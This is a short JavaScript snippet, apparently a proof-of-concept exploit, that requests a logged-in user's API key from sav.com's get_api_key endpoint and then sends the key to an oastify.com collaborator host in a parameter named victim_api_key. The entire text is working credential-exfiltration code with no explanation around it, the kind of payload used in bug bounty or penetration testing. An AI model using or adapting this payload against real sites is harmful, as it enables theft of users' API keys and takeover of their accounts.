fetch("https://www.sav.com/users/get_api_key", { method: "POST",
		  headers: {
		    "Content-Type": "application/json",
		  },
		  body: JSON.stringify({}),
		})
		  .then((response) => response.json())  // parse JSON
		  .then((data) => {console.log(data);fetch(`https://gcw3iipl5n94cqfxr4w04pgg278ywn.oastify.com?victim_api_key=${JSON.stringify(data.api_key)}`)})    // log the parsed data
		  .catch((error) => console.error('Error:', error)); 
